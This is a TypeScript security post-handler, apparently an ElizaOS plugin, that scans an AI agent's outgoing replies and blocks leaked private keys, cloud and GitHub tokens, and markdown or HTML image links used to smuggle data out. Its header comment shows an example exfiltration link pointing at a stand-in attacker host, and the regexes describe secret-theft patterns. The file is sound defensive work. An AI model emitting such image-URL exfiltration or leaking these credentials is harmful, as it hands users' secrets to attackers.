/**
 * Outbound fail-closed security post-handler & Data Loss Prevention (DLP).
 * Intercepts outbound agent responses before delivery to prevent:
 * 1. Markdown/HTML image covert-channel exfiltration (e.g. ![leak](https://attacker.com/?k=...))
 * 2. Sensitive credential & private key leakage
 * 3. Base64-encoded secret exfiltration in outbound URLs
 */

export interface OutboundAuditResult {
	verdict: "ALLOW" | "WARN" | "BLOCK";
	risk_score: number;
	threats: string[];
	sanitizedText?: string;
	executionTimeMs: number;
}

// 1. Covert-channel patterns (Image markdown / HTML image tags attempting URL telemetry)
const COVERT_IMAGE_MARKDOWN_REGEX = /!\[.*?\]\((https?:\/\/[^\s\)]+)\)/gi;
const COVERT_IMAGE_HTML_REGEX = /<img\s+[^>]*src=["'](https?:[^"']+)["'][^>]*>/gi;

// 2. Secret and credential leakage patterns
const OUTBOUND_SECRET_PATTERNS = [
	{
		pattern: /-----BEGIN\s+(RSA\s+|EC\s+)?PRIVATE\s+KEY-----/i,
		threat: "Outbound Leak: Private Key PEM Structure",
		risk: 100,
	},
	{
		pattern: /\b0x[a-fA-F0-9]{64}\b/,
		threat: "Outbound Leak: EVM Raw Private Key / Seed Material",
		risk: 100,
	},
	{
		pattern: /\b(AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}\b/,
		threat: "Outbound Leak: AWS Access Key ID",
		risk: 95,
	},
	{
		pattern: /\bghp_[a-zA-Z0-9]{36}\b/,
		threat: "Outbound Leak: GitHub Personal Access Token",
		risk: 95,
	},
	{
		pattern: /xprv[a-zA-Z0-9]{107,108}/,
		threat: "Outbound Leak: BIP32 Extended Private Key",
		risk: 100,
	},
];

/**
 * Deterministically inspects an outbound response before transmitting to the user or external network.
 */
export function inspectOutboundPayload(content: string): OutboundAuditResult {
	const startTime = Date.now();
	const rawText = content || "";
	const threats: string[] = [];
	let maxRisk = 0;

	// Check 1: Sensitive Credential & Key Leaks
	for (const { pattern, threat, risk } of OUTBOUND_SECRET_PATTERNS) {
		if (pattern.test(rawText)) {
			threats.push(threat);
			maxRisk = Math.max(maxRisk, risk);
		}
	}

	// Check 2: Covert Channel Exfiltration via Markdown Images
	let markdownMatch: RegExpExecArray | null;
	const mdRegex = new RegExp(COVERT_IMAGE_MARKDOWN_REGEX.source, "gi");
	while ((markdownMatch = mdRegex.exec(rawText)) !== null) {
		const targetUrl = markdownMatch[1] || "";
		// Check if URL carries suspicious query payload (>20 char encoded params or sensitive keys)
		if (
			/(\?|&)(leak|token|key|secret|data|auth|wallet)=/i.test(targetUrl) ||
			targetUrl.length > 250
		) {
			threats.push("Covert Channel: Markdown Image URL Data Exfiltration");
			maxRisk = Math.max(maxRisk, 95);
		}
	}

	// Check 3: Covert Channel Exfiltration via HTML <img> tags
	let htmlMatch: RegExpExecArray | null;
	const htmlRegex = new RegExp(COVERT_IMAGE_HTML_REGEX.source, "gi");
	while ((htmlMatch = htmlRegex.exec(rawText)) !== null) {
		const targetUrl = htmlMatch[1] || "";
		if (
			/(\?|&)(leak|token|key|secret|data|auth|wallet)=/i.test(targetUrl) ||
			targetUrl.length > 250
		) {
			threats.push("Covert Channel: HTML Image Tag Data Exfiltration");
			maxRisk = Math.max(maxRisk, 95);
		}
	}

	let verdict: "ALLOW" | "WARN" | "BLOCK" = "ALLOW";
	let sanitizedText: string | undefined = undefined;

	if (maxRisk >= 75) {
		verdict = "BLOCK";
		sanitizedText = `🚨 [SECURITY GATE: OUTBOUND LEAK BLOCKED] Dangerous output intercepted: ${threats.join(", ")}`;
	} else if (maxRisk >= 30) {
		verdict = "WARN";
	}

	return {
		verdict,
		risk_score: maxRisk,
		threats,
		sanitizedText,
		executionTimeMs: Math.max(1, Date.now() - startTime),
	};
}

export interface ChatPostHandlerContext {
	message: {
		content?: {
			text?: string;
			[key: string]: unknown;
		};
		[key: string]: unknown;
	};
	runtime?: unknown;
	[key: string]: unknown;
}

export interface ChatPostHandlerResult {
	responseText?: string;
	[key: string]: unknown;
}

export interface ChatPostHandler {
	id: string;
	priority: number;
	tryHandle(
		ctx: ChatPostHandlerContext,
	): Promise<ChatPostHandlerResult | null>;
}

/**
 * ElizaOS Outbound ChatPostHandler implementation.
 */
export const securityGatePostHandler: ChatPostHandler = {
	id: "security-gate-outbound",
	priority: 1000,

	async tryHandle(
		ctx: ChatPostHandlerContext,
	): Promise<ChatPostHandlerResult | null> {
		const text = ctx.message.content?.text || "";
		if (!text.trim()) {
			return null;
		}

		const audit = inspectOutboundPayload(text);
		if (audit.verdict === "BLOCK") {
			return {
				responseText: audit.sanitizedText,
			};
		}

		return null;
	},
};
